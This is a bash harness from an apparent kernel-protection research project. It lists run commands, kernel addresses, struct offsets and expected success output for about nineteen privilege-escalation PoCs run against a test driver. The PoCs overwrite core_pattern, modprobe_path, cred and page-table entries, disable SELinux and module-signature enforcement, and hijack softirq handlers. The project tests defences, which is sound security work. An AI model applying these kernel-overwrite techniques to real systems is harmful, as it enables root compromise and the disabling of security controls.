#!/bin/bash
# FZY: The arbrw PoC table - the run command for every PoC, and the output each
# one produces when it works on the original, unprotected kernel. Both host
# drivers source this file rather than copying it: run_poc_ori_kernel.py turns
# the table into pass/fail checks, and run_poc_sdp_kernel.py rewrites the mode
# argument and the addresses for the SDP kernel before it runs the same
# commands. Running this file directly just executes the PoCs.
#
#   cd ~/poc && ./poc_table.sh          # in the guest: run every PoC
#   cd ~/poc && ./poc_table.sh cred fs  # in the guest: run just these
#   cd sensitive-data-protect && ./run_poc_ori_kernel.py
#                                           # on the host: boot both VMs, build
#                                           # the PoCs and check every one of them
#
# The addresses come from the vmlinux the running kernel was built from and are
# valid only for that build (the boot cmdline carries "nokaslr", so link-time
# addresses are runtime ones). run_poc_ori_kernel.py reads them out of vmlinux
# with nm and exports them before sourcing this file, so they stay correct
# across rebuilds on their own; the values below are the fallback for running
# this file by hand in the guest, where there is no vmlinux to read.
#
#   cd sdp-linux-6.6
#   nm vmlinux | grep -E ' (core_pattern|modprobe_path|init_fs|init_nsproxy|init_mm|kernel_map|thread_hijack_target|sig_enforce|selinux_state|aa_g_audit|sysctl_unprivileged_bpf_disabled|sysctl_io_uring_disabled|kptr_restrict|panic_on_oops|softirq_vec|vulnerable_function)$'
#   pahole -C task_struct  vmlinux | grep -E 'cred;|fs;|files;|nsproxy;|mm;|thread;'
#   pahole -C mm_struct    vmlinux | grep -E 'pgd;|start_brk;'
#   pahole -C files_struct vmlinux | grep 'fdt;'
#   pahole -C fdtable      vmlinux | grep 'fd;'
#   pahole -C file         vmlinux | grep 'f_op;'

# ---- kernel symbol addresses (nm vmlinux) ---------------------------------
# ${VAR:-...}: the host driver exports the addresses of the vmlinux the VM
# actually boots, and they win over these fallbacks.
CORE_PATTERN=${CORE_PATTERN:-ffffffff8108af98}
MODPROBE_PATH=${MODPROBE_PATH:-ffffffff81083cf8}
INIT_NSPROXY=${INIT_NSPROXY:-ffffffff81010e00}
INIT_FS=${INIT_FS:-ffffffff8108a7b0}
INIT_MM=${INIT_MM:-ffffffff81089080}
KERNEL_MAP=${KERNEL_MAP:-ffffffff80d7fc70}
VULN_FUNC=${VULN_FUNC:-ffffffff8043622e}          # arbrw vulnerable_function: the code page to flip
THREAD_HIJACK_TARGET=${THREAD_HIJACK_TARGET:-ffffffff80435bb4}
SIG_ENFORCE=${SIG_ENFORCE:-ffffffff810c8c78}
SELINUX_ENFORCING=${SELINUX_ENFORCING:-ffffffff811063b0}  # selinux_state + offsetof(enforcing) == +0
AA_G_AUDIT=${AA_G_AUDIT:-ffffffff810cb128}
UNPRIV_BPF_DISABLED=${UNPRIV_BPF_DISABLED:-ffffffff810c8d00}
IO_URING_DISABLED=${IO_URING_DISABLED:-ffffffff810cb250}
KPTR_RESTRICT=${KPTR_RESTRICT:-ffffffff810cbf38}
PANIC_ON_OOPS=${PANIC_ON_OOPS:-ffffffff810c8a88}
SOFTIRQ_VEC=${SOFTIRQ_VEC:-ffffffff81008080}

# ---- struct offsets (pahole) ----------------------------------------------
TASK_CRED_OFF=0x610       # task_struct.cred        (1552)
TASK_FS_OFF=0x650         # task_struct.fs          (1616)
TASK_FILES_OFF=0x658      # task_struct.files       (1624)
TASK_NSPROXY_OFF=0x668    # task_struct.nsproxy     (1640)
TASK_MM_OFF=0x3b0         # task_struct.mm          (944)
TASK_THREAD_RA_OFF=0x8d8  # task_struct.thread.ra   (2264 + 0)
MM_PGD_OFF=0x70           # mm_struct.pgd           (112)
MM_START_BRK_OFF=0x150    # mm_struct.start_brk     (336)
FILES_FDT_OFF=0x20        # files_struct.fdt        (32)
FDT_FD_OFF=0x8            # fdtable.fd              (8)
FILE_FOP_OFF=0xb0         # file.f_op               (176)

# ---- the PoC table --------------------------------------------------------
# POC_CMD      what to run, from this directory
# POC_OUT      line the PoC must print to count as successful
# POC_DMESG    line the kernel must log (some PoCs prove themselves only there)
# POC_RESTORE  line the PoC prints once it has put the kernel back
# POC_NOTE     anything the caller has to know

POC_ORDER=(core_pattern modprobe_path cred nsproxy fs page_table init_mm mm
           thread sig_enforce selinux_state aa_g_audit
           sysctl_unprivileged_bpf_disabled sysctl_io_uring_disabled
           kptr_restrict panic_on_oops return_address softirq_action
           file_op_privesc)

declare -A POC_CMD POC_OUT POC_DMESG POC_RESTORE POC_NOTE

POC_CMD[core_pattern]="./core_pattern_poc 0 $CORE_PATTERN"
POC_OUT[core_pattern]="[+] Payload executed successfully!"
POC_RESTORE[core_pattern]="[+] core_pattern restored"

POC_CMD[modprobe_path]="./modprobe_path_poc 0 $MODPROBE_PATH"
POC_OUT[modprobe_path]="[+] Payload executed successfully!"
POC_RESTORE[modprobe_path]="[+] modprobe_path restored"

# stdbuf is required: the PoC execs /bin/sh, which throws away block-buffered
# stdout when stdout is not a tty. The piped "id" is what that root shell runs.
POC_CMD[cred]="echo id | stdbuf -oL ./cred_poc 0 $TASK_CRED_OFF"
POC_OUT[cred]="[+] === PRIVILEGE ESCALATION SUCCESS ==="

# The wrapper does the unshare + hostname setup as root, then drops back.
POC_CMD[nsproxy]="./run_nsproxy_poc.sh 0 $TASK_NSPROXY_OFF 0x$INIT_NSPROXY"
POC_OUT[nsproxy]="[+] SUCCESS: task_struct.nsproxy was redirected to init_nsproxy"
POC_RESTORE[nsproxy]="[+] Restoring original task->nsproxy"

# The wrapper builds the chroot jail as root and drops back before running the
# PoC inside it, so the overwrite is a real chroot escape.
POC_CMD[fs]="./run_fs_poc.sh 0 $TASK_FS_OFF 0x$INIT_FS"
POC_OUT[fs]="[+] SUCCESS: task_struct.fs was redirected to init_fs"
POC_RESTORE[fs]="[+] Restoring original task->fs"

# The walk assumes Sv48, so the guest must boot with "no5lvl" (see
# run_oriqemu_cuslinux.sh); "no4lvl" gives Sv39 and the walk aborts at level 1.
POC_CMD[page_table]="./page_table_poc 0 $INIT_MM $MM_PGD_OFF $VULN_FUNC $KERNEL_MAP"
POC_OUT[page_table]="[+] A kernel code page that was read-execute is now read-write-execute."
POC_RESTORE[page_table]="[+] Restoring original PTE (R+X)..."

# Same Sv48 walk as page_table, but framed on init_mm: it starts from init_mm,
# follows .pgd and flips the target code PTE from R+X to R+W+X.
POC_CMD[init_mm]="./init_mm_poc 0 $INIT_MM $MM_PGD_OFF $VULN_FUNC $KERNEL_MAP"
POC_OUT[init_mm]="[+] A kernel code page that was read-execute is now read-write-execute."
POC_RESTORE[init_mm]="[+] Restoring original PTE (R+X)..."

POC_CMD[mm]="./mm_struct_poc 0 $TASK_MM_OFF $MM_START_BRK_OFF"
POC_OUT[mm]="[+] SUCCESS: /proc/self/stat reflects the corrupted start_brk!"
POC_RESTORE[mm]="[+] Restoring original start_brk..."

POC_CMD[thread]="./thread_poc 0 $TASK_THREAD_RA_OFF $THREAD_HIJACK_TARGET"
POC_DMESG[thread]="arb_rw: *** THREAD RA HIJACK SUCCESS! ***"
POC_NOTE[thread]="the hijacked child dies; the cgroup_exit WARNING in dmesg is expected"

# Needs msdos.ko, an unsigned module from THIS kernel build, in this directory;
# build.sh copies it here.
POC_CMD[sig_enforce]="./sig_enforce_poc 0 $SIG_ENFORCE"
POC_OUT[sig_enforce]="[+] Unsigned module load went from rejected to accepted"
POC_RESTORE[sig_enforce]="[+] sig_enforce restored"
POC_NOTE[sig_enforce]="CONFIG_MODULE_UNLOAD is off, so msdos stays resident; reboot before rerunning"

POC_CMD[selinux_state]="PATH=/usr/sbin:/sbin:\$PATH ./selinux_state_poc 0 $SELINUX_ENFORCING"
POC_OUT[selinux_state]="[+] Exploit succeeded! SELinux is in permissive mode now."
POC_RESTORE[selinux_state]="[+] state_enforce restored"
POC_NOTE[selinux_state]="needs the SELinux VM (run_vm.sh --selinux); the default VM boots lsm=capability,apparmor"

POC_CMD[aa_g_audit]="./aa_g_audit_poc 0 $AA_G_AUDIT"
POC_OUT[aa_g_audit]="Audit mode is AUDIT_QUIET now, which would quiet all messages"
POC_RESTORE[aa_g_audit]="[+] aa_g_audit restored"

POC_CMD[sysctl_unprivileged_bpf_disabled]="./sysctl_unprivileged_bpf_disabled_poc 0 $UNPRIV_BPF_DISABLED"
POC_OUT[sysctl_unprivileged_bpf_disabled]="[+] SUCCESS: unprivileged_bpf_disabled is 0 now"
POC_RESTORE[sysctl_unprivileged_bpf_disabled]="[+] sysctl_unprivileged_bpf_disabled restored"

POC_CMD[sysctl_io_uring_disabled]="./sysctl_io_uring_disabled_poc 0 $IO_URING_DISABLED"
POC_OUT[sysctl_io_uring_disabled]="[+] SUCCESS: sysctl_io_uring_disabled is 0 now"
POC_RESTORE[sysctl_io_uring_disabled]="[+] sysctl_io_uring_disabled restored"

POC_CMD[kptr_restrict]="./kptr_restrict_poc 0 $KPTR_RESTRICT"
POC_OUT[kptr_restrict]="[+] Verification successful"
POC_RESTORE[kptr_restrict]="[+] kptr_restrict restored"

# The oops kills a forked child, the parent survives to restore the knob. The
# piped newline answers the PoC's "Press Enter" prompt.
POC_CMD[panic_on_oops]="echo | ./panic_on_oops_poc 0 $PANIC_ON_OOPS"
POC_OUT[panic_on_oops]="[+] System is still running!"
POC_RESTORE[panic_on_oops]="[+] panic_on_oops restored"

# The driver restores the return address itself. The gadget runs
# commit_creds(&init_cred), so the PoC execs /bin/sh on success and needs the
# same stdbuf treatment as cred; the piped "id" is what that root shell runs.
POC_CMD[return_address]="echo id | stdbuf -oL ./ret_addr_poc 0"
POC_OUT[return_address]="[+] === PRIVILEGE ESCALATION SUCCESS ==="
POC_DMESG[return_address]="arb_rw: *** EXPLOITATION SUCCESS! ***"

# The PoC adds the [TIMER_SOFTIRQ] index itself, so pass the base address.
POC_CMD[softirq_action]="./softirq_action_poc $SOFTIRQ_VEC"
POC_OUT[softirq_action]="[+] Softirq handler hijacked successfully!"
POC_DMESG[softirq_action]="*** SOFTIRQ HIJACKING SUCCESS! ***"
POC_RESTORE[softirq_action]="[+] Softirq handler successfully restored"

# The fake file_operations points .read at the commit_creds(&init_cred) gadget,
# so the PoC execs /bin/sh on success: stdbuf again, and "id" for that shell.
# file_op_poc is the same overwrite with a dmesg-only gadget, kept for debugging.
POC_CMD[file_op_privesc]="echo id | stdbuf -oL ./file_op_privesc_poc 0 $TASK_FILES_OFF $FILES_FDT_OFF $FDT_FD_OFF $FILE_FOP_OFF"
POC_OUT[file_op_privesc]="[+] === PRIVILEGE ESCALATION SUCCESS ==="
POC_DMESG[file_op_privesc]="*** FILE_OP PRIVESC GADGET EXECUTED ***"
POC_RESTORE[file_op_privesc]="[+] Restoring file->f_op to"

# Executed directly: just run the PoCs. The host drivers source us instead.
if [ "${BASH_SOURCE[0]}" = "$0" ]; then
  cd "$(dirname "$(readlink -f "$0")")" || exit 1
  for name in "${POC_ORDER[@]}"; do
    if [ $# -gt 0 ]; then
      printf '%s\n' "$@" | grep -qx "$name" || continue
    fi
    echo "=== $name: ${POC_CMD[$name]}"
    eval "${POC_CMD[$name]}"
    echo
  done
fi
